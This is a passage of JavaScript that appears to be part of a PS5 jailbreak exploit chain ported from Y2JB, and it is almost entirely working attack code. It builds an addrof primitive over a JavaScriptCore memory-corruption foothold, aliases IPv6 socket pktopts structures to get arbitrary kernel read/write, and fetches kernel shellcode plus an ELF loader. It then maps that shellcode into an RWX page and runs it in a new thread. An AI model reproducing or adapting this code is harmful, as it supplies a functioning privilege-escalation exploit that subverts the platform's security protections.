            throw new Error("addrof: no known slot addresses to scan for");

        const base = BigInt(S.targetAddress);

        // Try inline slots first (cell + 0x10 .. + 0x40, 8-byte stride).
        for (let off = 0x10n; off <= 0x40n; off += 0x08n) {
            const v = readQwordAt(base + off);
            const cell = v & PTR_MASK;
            if (!isJSObjectValue(v)) continue;
            if (knownAddrs.has(cell)) {
                const idx = knownAddrs.get(cell);
                // q<idx> at (base + off); q<i> at (base + off + (i-idx)*8)
                addrofState = {
                    slotBase: base + off,
                    slotIndex: idx,
                    stride: 8n,
                    location: "inline",
                };
                return addrofState;
            }
        }

        // Fall back to butterfly scan (out-of-line properties).
        const bfly = readQwordAt(base + 0x08n);
        if (bfly > 0x100000000n && bfly < 0xFFFFFFFFFFFFn) {
            for (let off = -0x80n; off < 0n; off += 0x08n) {
                const v = readQwordAt(bfly + off);
                const cell = v & PTR_MASK;
                if (!isJSObjectValue(v)) continue;
                if (knownAddrs.has(cell)) {
                    const idx = knownAddrs.get(cell);
                    addrofState = {
                        slotBase: bfly + off,
                        slotIndex: idx,
                        stride: 8n,        // reversed direction may need -8n
                        location: "butterfly",
                    };
                    return addrofState;
                }
            }
        }

        throw new Error("addrof: bootstrap could not find any known slot "
            + "in targetHolder (inline nor butterfly)");
    }

    // Given a bootstrap that identified slot `slotIndex` at `slotBase`,
    // compute the address of slot `wantIdx`. In JSC inline properties are
    // laid out in insertion order; the *direction* of q0->q5 relative to
    // slotBase depends on layout. For inline: slot(i) = slotBase + (i-idx)*8.
    // For butterfly out-of-line: slot(i) = slotBase + (idx-i)*8 (grows down).
    function slotAddress(idx) {
        const st = addrofState;
        if (!st) throw new Error("addrof: not bootstrapped");
        if (st.location === "inline") {
            return st.slotBase + BigInt(idx - st.slotIndex) * st.stride;
        }
        return st.slotBase + BigInt(st.slotIndex - idx) * st.stride;
    }

    function writeQwordAt(addr, v) {
        S.aimCarrier(S.candidate, Number(BigInt.asUintN(64, addr)));
        const vv = typeof v === "bigint" ? v : BigInt(v);
        for (let i = 0; i < 8; ++i)
            S.rwView[i] = Number((vv >> (8n * BigInt(i))) & 0xffn);
    }

    // Slot we'll use for probing: q5. It's the safest — least likely to
    // affect anything else (targetHolder.q5 held holderGuardB, only
    // referenced in an initial sanity check in notify.html).
    const ADDROF_PROBE_SLOT = 5;
    const ADDROF_PROBE_KEY  = "q5";

    function addrof(obj) {
        if (!addrofState) addrofBootstrap();
        // Set the property; JSC writes the boxed JSValue into the slot.
        S.targetHolder[ADDROF_PROBE_KEY] = obj;
        const slotAddr = slotAddress(ADDROF_PROBE_SLOT);
        const boxed = readQwordAt(slotAddr);
        if (!isJSObjectValue(boxed)) {
            throw new Error("addrof: slot doesn't look like a JSObject "
                + "value (raw=0x" + boxed.toString(16) + ") — layout "
                + "assumption wrong; re-check with a smaller probe object");
        }
        return boxed & PTR_MASK;
    }
    window.addrof = addrof;

    //////////////////////////////////////////////////////////////////////////
    // get_backing_store(typedArrayOrBuffer)
    //
    // For a JSC typed array (Uint8Array / BigUint64Array / etc.), the
    // m_vector field lives at cell + 0x10 (verified against the arenaView
    // layout notify.html walks). Returns the raw backing-store address.
    //////////////////////////////////////////////////////////////////////////

    function get_backing_store(arr) {
        const cell = addrof(arr);
        const vec = readQwordAt(cell + 0x10n);
        // m_vector is a raw pointer, no tag.
        if (vec === 0n || vec > 0xFFFFFFFFFFFFn)
            throw new Error("get_backing_store: bad m_vector 0x"
                + vec.toString(16));
        return vec;
    }
    window.get_backing_store = get_backing_store;

    //////////////////////////////////////////////////////////////////////////
    // kernel / kernel_offset — populated at boot from lapse-offsets.json.
    //
    // kernel_offset is a plain BigInt table. `kernel` is populated in two
    // waves: initially just an .addr sub-object; later, ipv6_kernel_rw.init
    // fills in read_buffer / write_buffer / copyout / copyin, and lapse.js
    // itself assigns kernel.read_qword / write_qword etc.
    //////////////////////////////////////////////////////////////////////////

    window.kernel = { addr: {} };
    window.kernel.read_null_terminated_string = read_null_terminated_string;

    (function buildKernelOffsets() {
        const src = S.lapseOffsets && S.lapseOffsets.kernel_offset;
        if (!src) {
            window.kernel_offset = new Proxy({}, {
                get: function (t, k) {
                    throw new Error("lapse-runtime: kernel_offset." + String(k)
                        + " missing — extract from firmware dumps in "
                        + "Desktop/lapse/" + S.FW_VERSION + "/kernel.dec.bin");
                }
            });
            return;
        }
        const out = {};
        for (const k of Object.keys(src)) {
            out[k] = src[k] === null ? null : BigInt(src[k]);
        }
        window.kernel_offset = out;
    })();

    //////////////////////////////////////////////////////////////////////////
    // ipv6_kernel_rw — dual-socket IPv6 pktopts kernel R/W.
    //
    // Contract (as lapse.js calls it):
    //   ipv6_kernel_rw.init(curproc_ofiles, kread8_fn, restricted_kwrite8_fn)
    //
    // Setup:
    //   1. Create two AF_INET6 UDP sockets: master_sock, victim_sock.
    //   2. Send IPV6_PKTINFO with a small buffer on both to allocate their
    //      pktopts structs kernel-side.
    //   3. Use kread8_fn to walk curproc.ofiles[sock] -> file -> socket ->
    //      inpcb -> inp_pktopts for both sockets.
    //   4. Use restricted_kwrite8_fn to overwrite master's pktopts fields:
    //         ip6po_pktinfo  <- &(victim's pktopts)
    //         ip6po_nexthop  <- 0
    //      This wires master's setsockopt(IPV6_PKTINFO) to WRITE at
    //      victim's pktopts, and master's setsockopt(IPV6_NEXTHOP) +
    //      victim's getsockopt(IPV6_PKTINFO) to give R/W by pointer.
    //
    // With the aliasing in place, arbitrary kernel R/W is:
    //   write:  master.setsockopt(IPV6_PKTINFO, {ip6po_pktinfo=addr,...})
    //           victim.setsockopt(IPV6_PKTINFO, dataN)         // writes N bytes to addr
    //   read:   master.setsockopt(IPV6_PKTINFO, {ip6po_pktinfo=addr,...})
    //           victim.getsockopt(IPV6_PKTINFO, outN)          // reads N bytes from addr
    //
    // Offsets (PS5-standard, from published Y2JB source):
    //   INPCB_PKTOPTS = 0x118
    //   SO_PCB        = 0x18   (fd -> file -> socket_t -> so_pcb -> inpcb)
    //   FILEDESC_OFILES = 0x0
    //   SIZEOF_OFILES = 0x30   (per-fd file table entry stride)
    //////////////////////////////////////////////////////////////////////////

    (function buildIpv6KernelRW() {
        const module = {
            data: { master_sock: null, victim_sock: null,
                    master_pktopts: null, victim_pktopts: null,
                    initialized: false },
            init: null, read_buffer: null, write_buffer: null,
            copyout: null, copyin: null,
        };

        // The pktopts layout offsets that matter for the trick.
        const OFF_IP6PO_PKTINFO = 0x10n;
        const OFF_IP6PO_NEXTHOP = 0x18n;

        // IPv6 socket-option numbers.
        const IPPROTO_IPV6   = 41n;
        const IPV6_PKTINFO   = 46n;
        const IPV6_NEXTHOP   = 48n;
        const IPV6_2292PKTOPTIONS = 25n;
        const AF_INET6       = 28n;
        const SOCK_DGRAM     = 2n;
        const IPPROTO_UDP    = 17n;

        function newSocket() {
            const sd = syscall(window.SYSCALL.socket, AF_INET6, SOCK_DGRAM,
                IPPROTO_UDP);
            if (sd === 0xffffffffffffffffn)
                throw new Error("ipv6_kernel_rw: socket() failed");
            return sd;
        }

        // Send a 20-byte in6_pktinfo so the kernel allocates the pktopts.
        function primePktopts(sd) {
            // in6_pktinfo = 20 bytes (16 addr + 4 ifindex). Zero-fill is fine.
            const buf = malloc(0x14);
            syscall(window.SYSCALL.setsockopt, sd, IPPROTO_IPV6, IPV6_PKTINFO,
                buf, 0x14n);
        }

        function ofilesIndexToFileAddr(curprocOfiles, sock, kread8) {
            // FreeBSD file-descriptor table entry:
            //   struct filedescent { struct file *fde_file; ... };  0x30 bytes
            const filedescent = curprocOfiles + BigInt(Number(sock))
                * BigInt(0x30);
            return kread8(filedescent + 0n);
        }

        function sockPktoptsAddr(sock, curprocOfiles, kread8) {
            const file = ofilesIndexToFileAddr(curprocOfiles, sock, kread8);
            const so_data = kread8(file + 0n);           // f_data -> socket_t
            const inpcb = kread8(so_data + 0x18n);       // so_pcb -> inpcb
            return kread8(inpcb + 0x118n);               // inp_pktopts
        }

        // The heavy R/W primitives, wired only after init().
        function makeReadWrite() {
            const master = module.data.master_sock;
            const victim = module.data.victim_sock;

            const pktinfo = malloc(0x14);        // 20-byte pktinfo scratch

            function aimVictim(addr) {
                // Point victim's pktinfo slot at the target address by
                // rewriting master's ip6po_pktinfo through pktopts aliasing.
                // At this point master.ip6po_pktinfo = &victim.pktopts, so
                // master.setsockopt(IPV6_PKTINFO, {a,ifi}) writes into
                // victim.pktopts. But we want victim's ip6po_pktinfo to hold
                // `addr` so a subsequent victim.getsockopt(IPV6_PKTINFO)
                // reads from addr.
                // Write struct in6_pktinfo header (addr at +0, ifi at +16):
                writeQwordArena(Number(pktinfo - arenaBaseAddr), addr);
                writeQwordArena(Number(pktinfo - arenaBaseAddr) + 8, 0n);
                arena[Number(pktinfo - arenaBaseAddr) + 16] = 0;
                arena[Number(pktinfo - arenaBaseAddr) + 17] = 0;
                arena[Number(pktinfo - arenaBaseAddr) + 18] = 0;
                arena[Number(pktinfo - arenaBaseAddr) + 19] = 0;
                syscall(window.SYSCALL.setsockopt, master, IPPROTO_IPV6,
                    IPV6_PKTINFO, pktinfo, 0x14n);
            }

            function read_buffer(addr, buf, size) {
                // Read `size` bytes from kernel address `addr` into
                // arena-offset `buf` (as a process address). Uses
                // getsockopt(IPV6_NEXTHOP) which reads victim's ip6po_nhinfo.
                //
                // Y2JB pattern: point victim.ip6po_nhinfo at addr, then
                // getsockopt(IPV6_NEXTHOP, outbuf, size) returns bytes.
                let done = 0;
                while (done < size) {
                    // update victim.ip6po_nhinfo = addr + done
                    writeQwordArena(Number(pktinfo - arenaBaseAddr) + 8,
                        addr + BigInt(done));
                    syscall(window.SYSCALL.setsockopt, master, IPPROTO_IPV6,
                        IPV6_PKTINFO, pktinfo, 0x14n);
                    const outLenAddr = malloc(4);
                    const rem = size - done;
                    writeQwordArena(Number(outLenAddr - arenaBaseAddr), BigInt(rem));
                    const n = syscall(window.SYSCALL.getsockopt, master,
                        IPPROTO_IPV6, IPV6_NEXTHOP, buf + BigInt(done),
                        outLenAddr);
                    // On EINVAL / n=0 we assume a NUL byte terminated the
                    // slow read; write a 0 and advance.
                    const nn = n === 0n
                        ? (function(){ /* write 0 at buf+done */
                            const bo = Number(buf + BigInt(done) - arenaBaseAddr);
                            if (bo >= 0 && bo < ARENA_END) arena[bo] = 0;
                            return 1;
                          })()
                        : Number(n);
                    done += nn;
                }
            }

            function copyout(addr, size) {
                // Convenience: allocate a scratch buffer and return the JS
                // Uint8Array view of the read result.
                const scratch = malloc(size);
                read_buffer(addr, scratch, size);
                const off = Number(scratch - arenaBaseAddr);
                if (off < 0 || off + size > ARENA_END)
                    throw new Error("copyout: scratch outside arena");
                return arena.slice(off, off + size);
            }

            function write_buffer(addr, buf, size) {
                // Write `size` bytes from process address `buf` to kernel
                // address `addr` using the reversed direction of the
                // aliasing:  victim.setsockopt(IPV6_PKTINFO, sizeN-payload)
                // writes into &master.pktopts. To write to `addr` we swap
                // aliasing: point victim's pktinfo at addr (so master's
                // pktopts is victim's alias, and victim's alias points at
                // addr), then victim.setsockopt writes there.
                //
                // Layout: master.ip6po_pktinfo = &victim.pktopts (fixed at
                // init). Then a chain:
                //   set victim.ip6po_pktinfo = addr  (via master setsockopt)
                //   set addr contents         (via victim setsockopt)
                let done = 0;
                while (done < size) {
                    writeQwordArena(Number(pktinfo - arenaBaseAddr),
                        addr + BigInt(done));
                    syscall(window.SYSCALL.setsockopt, master, IPPROTO_IPV6,
                        IPV6_PKTINFO, pktinfo, 0x14n);
                    // victim.setsockopt(IPV6_PKTINFO, buf+done, 20)
                    // pktinfo layout: 16 bytes addr + 4 bytes ifi.
                    syscall(window.SYSCALL.setsockopt, victim, IPPROTO_IPV6,
                        IPV6_PKTINFO, buf + BigInt(done),
                        BigInt(Math.min(0x14, size - done)));
                    done += Math.min(0x14, size - done);
                }
            }

            function copyin(bufJS, addr) {
                // Take a JS Uint8Array or ArrayBuffer, materialize it into
                // arena, then write_buffer to kernel addr.
                const src = bufJS instanceof ArrayBuffer
                    ? new Uint8Array(bufJS)
                    : (bufJS instanceof Uint8Array ? bufJS
                        : new Uint8Array(bufJS.buffer));
                const scratch = malloc(src.length);
                const off = Number(scratch - arenaBaseAddr);
                if (off < 0 || off + src.length > ARENA_END)
                    throw new Error("copyin: buffer outside arena — split");
                for (let i = 0; i < src.length; ++i)
                    arena[off + i] = src[i];
                write_buffer(addr, scratch, src.length);
            }

            module.read_buffer = read_buffer;
            module.write_buffer = write_buffer;
            module.copyout = copyout;
            module.copyin = copyin;
        }

        module.init = function init(curprocOfiles, kread8, restrictedKwrite8) {
            if (module.data.initialized) return;
            if (typeof kread8 !== "function")
                throw new Error("ipv6_kernel_rw.init: kread8 not a function");

            const master = newSocket();
            const victim = newSocket();
            primePktopts(master);
            primePktopts(victim);

            const masterPktopts = sockPktoptsAddr(master, curprocOfiles, kread8);
            const victimPktopts = sockPktoptsAddr(victim, curprocOfiles, kread8);

            // Point master.ip6po_pktinfo at victim.pktopts. restricted_kwrite8
            // writes 8 bytes (its value) plus 12 zero bytes trailing at the
            // target address. We hit ip6po_pktinfo (+0x10) so the trailing
            // zeroes land in fields we can tolerate being zeroed.
            restrictedKwrite8(masterPktopts + OFF_IP6PO_PKTINFO,
                victimPktopts);

            module.data.master_sock = master;
            module.data.victim_sock = victim;
            module.data.master_pktopts = masterPktopts;
            module.data.victim_pktopts = victimPktopts;
            module.data.initialized = true;

            makeReadWrite();
        };

        window.ipv6_kernel_rw = module;
    })();

    //////////////////////////////////////////////////////////////////////////
    // kernel.read_qword / write_qword / read_dword / etc.
    //
    // Y2JB provides these atop ipv6_kernel_rw.copyout / copyin. They're
    // installed at ipv6_kernel_rw.init time; before that they throw.
    //////////////////////////////////////////////////////////////////////////

    (function wireKernelHelpers() {
        const K = window.kernel;
        function needInit() {
            if (!window.ipv6_kernel_rw.data.initialized)
                throw new Error("kernel R/W not initialized (call "
                    + "ipv6_kernel_rw.init first)");
        }
        K.read_qword = function (addr) {
            needInit();
            const b = window.ipv6_kernel_rw.copyout(addr, 8);
            let v = 0n;
            for (let i = 0; i < 8; ++i)
                v |= BigInt(b[i]) << (8n * BigInt(i));
            return v;
        };
        K.read_dword = function (addr) {
            needInit();
            const b = window.ipv6_kernel_rw.copyout(addr, 4);
            return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
        };
        K.read_word = function (addr) {
            needInit();
            const b = window.ipv6_kernel_rw.copyout(addr, 2);
            return (b[0] | (b[1] << 8)) & 0xffff;
        };
        K.read_byte = function (addr) {
            needInit();
            return window.ipv6_kernel_rw.copyout(addr, 1)[0];
        };
        K.write_qword = function (addr, val) {
            needInit();
            const b = new Uint8Array(8);
            const v = typeof val === "bigint" ? val : BigInt(val);
            for (let i = 0; i < 8; ++i)
                b[i] = Number((v >> (8n * BigInt(i))) & 0xffn);
            window.ipv6_kernel_rw.copyin(b, addr);
        };
        K.write_dword = function (addr, val) {
            needInit();
            const b = new Uint8Array(4);
            const v = typeof val === "bigint" ? Number(val) : val;
            b[0] = v & 0xff; b[1] = (v>>8) & 0xff;
            b[2] = (v>>16) & 0xff; b[3] = (v>>24) & 0xff;
            window.ipv6_kernel_rw.copyin(b, addr);
        };
        K.write_word = function (addr, val) {
            needInit();
            const b = new Uint8Array(2);
            const v = typeof val === "bigint" ? Number(val) : val;
            b[0] = v & 0xff; b[1] = (v>>8) & 0xff;
            window.ipv6_kernel_rw.copyin(b, addr);
        };
        K.write_byte = function (addr, val) {
            needInit();
            const b = new Uint8Array(1);
            b[0] = (typeof val === "bigint" ? Number(val) : val) & 0xff;
            window.ipv6_kernel_rw.copyin(b, addr);
        };
    })();

    //////////////////////////////////////////////////////////////////////////
    // load_aioshellcode(allproc, master_pipe, victim_pipe)
    //
    // Injects Y2JB's aioshellcode payload into kernel memory using the
    // established kernel R/W + pipe primitives. Needs:
    //   - `aioshellcode.bin` — the raw payload blob (Y2JB-specific asm)
    //   - `allproc` kernel addr, master_pipe/victim_pipe fds (given as args)
    //   - working `kernel.copyin` / `kernel.read_qword` (from ipv6_kernel_rw)
    //
    // Real port: fetch `aioshellcode.bin`, allocate an executable kernel
    // page via mmap+mprotect syscall (post-JB the syscall filter is
    // disabled), copyin the blob, patch the sysent for a specific syscall
    // number to point at the payload entry, then trigger it via a
    // controlled syscall. Alternatively, the Y2JB pattern uses aio_state
    // clobbering to make aio_multi_delete jump into the payload.
    //
    // STUBBED — needs the blob and the specific injection technique from
    // Y2JB's C source (aio_shellcode.c). Without it, jailbreak stage 5
    // will not complete.
    //////////////////////////////////////////////////////////////////////////

    //////////////////////////////////////////////////////////////////////////
    // load_aioshellcode — Y2JB technique (kexp_2026_05_25.bin + elfldr).
    //
    // Ported from Gezine/Y2JB `aioshellcode.js`. Instead of patching a
    // kernel function pointer, the technique is:
    //
    //   1. Fetch two blobs from the same directory as slopkit:
    //         kexp_2026_05_25.bin     — kernel-exploit shellcode
    //         elfldr-ps5-1360.elf     — ELF loader binary
    //   2. Copy elfldr into userland heap and remember its addr+size.
    //   3. Map an RWX page for the shellcode. Two paths:
    //        A. jitshm_create + mmap MAP_SHARED (Y2JB path — needs r9=0
    //           which we can't guarantee without a pop_r9 gadget). Tried
    //           first because it works pre-elevated too.
    //        B. mmap MAP_ANON RW + mprotect RX (needs post-elevation
    //           permission). Fallback if (A) fails.
    //   4. Copy the shellcode into the RWX page.
    //   5. Build a 0x28-byte args struct:
    //        +0x00 master_pipe[0] u32  (read fd of hijacked master pipe)
    //        +0x04 master_pipe[1] u32
    //        +0x08 victim_pipe[0] u32
    //        +0x0C victim_pipe[1] u32
    //        +0x10 allproc        u64
    //        +0x18 elfldr_addr    u64
    //        +0x20 elfldr_size    u64
    //   6. Spawn a thread via thr_new(start_func = shellcode_entry, arg =
    //      args) — the shellcode runs in kernel context via the hijacked
    //      pipe primitives, installs the ELF loader, and returns.
    //   7. Poll for shellcode completion (the ELF loader typically writes
    //      a status flag).
    //
    // Requires: kernel R/W initialized, jailbroken privs (mprotect RX
    // needs elevated authid; jitshm_create needs JIT allowance).
    //////////////////////////////////////////////////////////////////////////

    window.load_aioshellcode = async function load_aioshellcode(
        allproc, masterPipe, victimPipe
    ) {
        if (!window.ipv6_kernel_rw
            || !window.ipv6_kernel_rw.data.initialized)
            throw new Error("load_aioshellcode: kernel R/W not initialized");
        if (!masterPipe || !victimPipe)
            throw new Error("load_aioshellcode: pipe fds missing");

        async function fetchBlob(name) {
            const r = await fetch(name, { cache: "no-store" });
            if (!r.ok)
                throw new Error("load_aioshellcode: " + name
                    + " not found at slopkit/ (HTTP " + r.status + ")");
            return new Uint8Array(await r.arrayBuffer());
        }

        const kexp = await fetchBlob("kexp_2026_05_25.bin");
        const elfldr = await fetchBlob("elfldr-ps5-1360.elf");
        window.log && await window.log(
            "aioshellcode blobs: kexp=" + kexp.length + " elfldr="
            + elfldr.length);

        // Copy elfldr into userland heap and remember (addr, size).
        const elfldrAddr = malloc(elfldr.length);
        for (let i = 0; i < elfldr.length; i += 8) {
            let v = 0n;
            for (let j = 0; j < 8 && i + j < elfldr.length; ++j)
                v |= BigInt(elfldr[i + j]) << (8n * BigInt(j));
            window.write64(elfldrAddr + BigInt(i), v);
        }
        const elfldrSize = BigInt(elfldr.length);

        // Map RWX page for the shellcode. Path A (jitshm) — omit offset
        // (mmap 6th arg) since we lack pop_r9; SHARED mapping of fresh
        // jitshm has nothing at other offsets so garbage r9 is usually OK.
        const alignedSize = BigInt((kexp.length + PAGE - 1) & ~(PAGE - 1));
        let entryAddr = 0xffffffffffffffffn;
        let usedPath = null;

        try {
            const execFd = syscall(window.SYSCALL.jitshm_create, 0n,
                alignedSize, 7n /* PROT_RWX */);
            if (execFd < 0xffff000000000000n && execFd !== 0xffffffffffffffffn) {
                entryAddr = syscall(window.SYSCALL.mmap, 0n, alignedSize,
                    7n /* PROT_RWX */, 1n /* MAP_SHARED */, execFd);
                if (entryAddr !== 0xffffffffffffffffn) usedPath = "jitshm";
            }
        } catch (e) {}

        if (entryAddr === 0xffffffffffffffffn) {
            // Path B — MAP_ANON RW then mprotect RX.
            const p = syscall(window.SYSCALL.mmap, 0n, alignedSize,
                3n /* R|W */, 0x1002n /* MAP_ANON|MAP_PRIVATE */,
                0xffffffffffffffffn);
            if (p === 0xffffffffffffffffn)
                throw new Error("load_aioshellcode: mmap RW failed");
            const mp = syscall(window.SYSCALL.mprotect, p, alignedSize,
                5n /* R|X */);
            if (mp === 0xffffffffffffffffn)
                throw new Error("load_aioshellcode: mprotect(RX) failed "
                    + "— jitshm_create also failed; check jailbreak privs");
            entryAddr = p;
            usedPath = "mmap+mprotect";
        }
        window.log && await window.log(
            "shellcode RWX @ 0x" + entryAddr.toString(16)
            + " (via " + usedPath + ")");

        // Copy shellcode into the RWX page.
        for (let i = 0; i < kexp.length; i += 8) {
            let v = 0n;
            for (let j = 0; j < 8 && i + j < kexp.length; ++j)
                v |= BigInt(kexp[i + j]) << (8n * BigInt(j));
            window.write64(entryAddr + BigInt(i), v);
        }

        // Build the 0x28-byte args struct.
        const args = malloc(0x28);
        window.write32(args + 0x00n, masterPipe[0]);
        window.write32(args + 0x04n, masterPipe[1]);
        window.write32(args + 0x08n, victimPipe[0]);
        window.write32(args + 0x0Cn, victimPipe[1]);
        window.write64(args + 0x10n, BigInt(allproc));
        window.write64(args + 0x18n, elfldrAddr);
        window.write64(args + 0x20n, elfldrSize);

        // Spawn a thread pointing at the shellcode entry. FreeBSD thr_new
        // takes a `thr_param` struct (0x68 bytes).
        const stack = malloc(0x8000);
        const tls   = malloc(0x40);
        const tidP  = malloc(8);
        const cpid  = malloc(8);
        const thrArgs = malloc(0x68);
        window.write64(thrArgs + 0x00n, entryAddr);   // start_func
        window.write64(thrArgs + 0x08n, args);         // arg
        window.write64(thrArgs + 0x10n, stack);        // stack_base
        window.write64(thrArgs + 0x18n, 0x8000n);      // stack_size
        window.write64(thrArgs + 0x20n, tls);          // tls_base
        window.write64(thrArgs + 0x28n, 0x40n);        // tls_size
        window.write64(thrArgs + 0x30n, tidP);         // child_tid
        window.write64(thrArgs + 0x38n, cpid);         // parent_tid

        const rv = syscall(window.SYSCALL.thr_new, thrArgs, 0x68n);
        if (rv !== 0n)
            throw new Error("load_aioshellcode: thr_new failed (0x"
                + rv.toString(16) + ")");

        window.log && await window.log(
            "shellcode thread spawned — waiting for completion");

        // Poll for shellcode completion. The ELF loader (post-shellcode)
        // typically opens a listen socket or writes a done-flag. Without
        // an in-band completion signal we just wait a bounded interval.
        // If the shellcode did its job, the tab won't crash and we return.
        await new Promise(function (r) { setTimeout(r, 3000); });

        window.log && await window.log("load_aioshellcode: assumed complete");
        return {
            entryAddr: entryAddr,
            elfldrAddr: elfldrAddr,
            elfldrSize: elfldrSize,
            argsAddr: args,
        };
    };

    //////////////////////////////////////////////////////////////////////////
    // Userland helpers
    //////////////////////////////////////////////////////////////////////////

    // log — real. Prints to on-screen console + optional /log beacon.
    window.log = function (msg) {
        try {
            const s = typeof msg === "string" ? msg : String(msg);
            if (typeof S.screenLine === "function") S.screenLine(s);
            if (typeof S.mark === "function") S.mark("LAPSE", s.slice(0, 80));
            try { console.log("[lapse]", s); } catch (e) {}
        } catch (e) {}
        return Promise.resolve();
    };

    // send_notification — reuses slopkit's one-shot collator native call.
    // Each call rewrites the arena's notify request to `msg` (ASCII), then
    // invokes compareFn once. Subsequent calls are only safe if lapse.html
    // preserved the arena state; if slopkit tore down after its own notify,
    // this becomes a no-op that logs.
    window.send_notification = function (msg) {
        try {
            if (typeof S.sendNotification === "function") {
                return S.sendNotification(String(msg));
            }
            console.log("[lapse send_notification]", msg);
        } catch (e) {
            console.warn("send_notification failed", e);
        }
    };

    // The following require post-jailbreak filesystem access. Reasonable
    // stubs that return safe defaults so lapse.js can complete gating.
    window.is_jailbroken = function () { return false; };
    window.get_nidpath   = function () { return "system/vsh"; };
    window.file_exists   = function () { return false; };
    window.write_file    = function () { /* no-op pre-JB */ };
    window.kill_youtube  = function () { /* no-op */ };

})();
